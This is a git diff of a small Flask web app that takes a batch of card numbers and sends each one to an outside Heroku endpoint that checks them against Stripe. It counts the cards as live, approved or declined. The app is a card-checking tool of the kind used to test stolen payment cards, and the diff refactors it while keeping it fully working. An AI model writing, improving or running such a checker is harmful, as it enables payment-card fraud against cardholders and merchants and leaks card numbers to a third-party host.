@@ -1,20 +1,18 @@
 from flask import Flask, request, jsonify, render_template
-import requests
-import time
+import requests, time
 
 app = Flask(__name__)
 
-API_URL = "https://lit-beach-04359-37fde60e4db4.herokuapp.com/stripe?cc={card}"
+API = "https://lit-beach-04359-37fde60e4db4.herokuapp.com/stripe?cc={card}"
 
 @app.route("/")
-def home():
+def index():
     return render_template("index.html")
 
 @app.route("/check", methods=["POST"])
-def check_cards():
+def check():
     data = request.get_json()
     cards = data.get("cards", [])
-    threads = int(data.get("threads", 1))
 
     results = []
     live = approved = declined = 0
@@ -26,12 +24,12 @@ def check_cards():
 
         start = time.time()
         try:
-            r = requests.get(API_URL.format(card=card), timeout=20)
-            res = r.json()
+            r = requests.get(API.format(card=card), timeout=15)
+            j = r.json()
             elapsed = int((time.time() - start) * 1000)
 
-            success = bool(res.get("success"))
-            response_msg = res.get("Response", "NO RESPONSE")
+            success = bool(j.get("success"))
+            resp = j.get("Response", "NO RESPONSE")
 
             if success:
                 live += 1
@@ -42,11 +40,11 @@ def check_cards():
             results.append({
                 "card": card,
                 "success": success,
-                "response": response_msg,
+                "response": resp,
                 "time": elapsed
             })
 
-        except Exception as e:
+        except Exception:
             declined += 1
             results.append({
                 "card": card,
@@ -61,5 +59,3 @@ def check_cards():
         "declined": declined,
         "results": results
     })
-
-# لا app.run() في Heroku
